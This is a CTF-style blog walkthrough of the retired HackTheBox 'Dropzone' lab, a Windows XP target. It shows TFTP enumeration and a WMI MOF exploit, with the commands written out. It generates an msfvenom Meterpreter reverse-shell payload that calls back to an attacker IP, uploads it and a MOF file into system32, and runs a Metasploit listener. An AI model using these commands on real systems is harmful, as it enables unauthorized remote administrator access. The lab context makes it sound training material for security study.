@@ -1,0 +1,64 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Dropzone Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-dropzone-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-11-04T18:00:53+00:00">November 4, 2018</time><time class="updated" datetime="2025-07-05T12:57:37+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Dropzone”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Leve</strong>l: Expert</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Dropzone is 10.10.10.90</span></p>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sU -T4 10.10.10.90</pre>
+<p><span style="color: #000000;">From the given below image, you can observe we found port 69 is open on the target system and running TFTP service.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TsE91fW8aRg/W98yiPVa8FI/AAAAAAAAa-M/UbnlmS6uZIkci_SbFEqPXzSTxNS6stGRwCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Then, we connect to the target system using a TFTP client and find that we can upload and download the file. We get the “boot.ini” file to find the operating system running system on the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tftp 10.10.10.90</pre>
+<p><span style="color: #000000;">We take a look at the boot.ini file and find that the target system is running “Windows XP”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat boot.ini</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-q2Yq-syRLg0/W98yidT9jiI/AAAAAAAAa-U/MMngEhGvloYn0ZvkKUkkpsOvOT02X1TOwCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Now, We are unable to find any exploit for TFTP service. So we are going to use MOF file WMI exploitation to get a reverse shell of the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.4 lport=443 -f exe &gt; hack.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3yXgTIDs0gA/W98yiCLaxJI/AAAAAAAAa-Q/DGiCNROyiJQRg1dPqG3lK3Z88KbKDObIgCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We have an MSF module called “wbemexec.rb” to generate MOF file (you can find the file here). We download the file and edit it to run our shellcode. You can download the modified code from <strong><a style="color: #000000;" href="https://github.com/Sayantan5/Dropzone">here</a></strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-oRQziGTQSZY/W98yjBiR1DI/AAAAAAAAa-Y/Pg-aC6IRm-IHBfSMQJVUvYPzUWjOtheaQCLcBGAs/s1600/4.1.png"/></span></p>
+<p><span style="color: #000000;">We upload both the shell and the MOF file using TFTP.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tftp&gt; binary
+tftp&gt; put hack.exe /WINDOWS/system32/hack.exe
+tftp&gt; put hack.mof /WINDOWS/system32/wbem/mof/hack.mof</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-GeSnAlmupKI/W98yjGiFw3I/AAAAAAAAa-c/QLWNB_fHutcJDi40o5WhMH8j5Sn9_-qqQCLcBGAs/s1600/4.png"/></strong></span></p>
+<p><span style="color: #000000;">We set up our listener before uploading both the files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.14.4
+msf exploit(multi/handler) &gt; set lport 443
+msf exploit(multi/handler) &gt; run</pre>
+<p><span style="color: #000000;">As soon as we upload the MOF file and our payload we get a reverse shell. After getting the reverse shell we check for system information and find that we have spawned a shell as administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; sysinfo
+meterpreter &gt; getuid</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wEpqBxW26BA/W98yjZoiBDI/AAAAAAAAa-g/kEnjZzNF4TchTAefazIGYhIyax4shInwgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then, we go to “c:\Documents and Settings\Administrator\Desktop” and find a file called “root.txt”. We take a look at the content of the file and find that the flag is not present there.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; cd Administrator
+meterpreter &gt; ls
+meterpreter &gt; cd Desktop
+meterpreter &gt; ls
+meterpreter &gt; cat root.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-I1diyUu9ooE/W98yjuD0BhI/AAAAAAAAa-k/1DXhF9Qr_cUCuSsxlUoKvJuk65lUZ-X6ACLcBGAs/s1600/6.png"/></strong></span></p>
+<p><span style="color: #000000;">Then, we go to the “<strong>flags</strong>” directory and find a file called “<strong>2 for the price of 1!.txt</strong>” and find a hint that we have to use alternate data streams to find the flags. Alternate data streams are an attribute that can be found in the NTFS file system. They can also be used to hide data from users.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; cd flags
+meterpreter &gt; dir
+meterpreter &gt; cat "2 for the price of 1!.txt"</pre>
+<p><span style="color: #000000;">We can use streams.exe from Sysinternals to examine Alternate Data Streams. (You can download the tool from <a style="color: #000000;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/streams">here</a>)</span></p>
+<p><span style="color: #000000;">We upload the streams.exe into the target machine. We spawn the shell and execute the file to find data streams in the current directory and find both user and root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; upload /root/Downloads/Streams/streams.exe
+meterpreter &gt; shell
+streams -accepteula -s .</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Q4vd0yMwXrg/W98ykPcS-PI/AAAAAAAAa-o/vom8scnvgwIFAQBCXObOJm8RngBXAUazACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
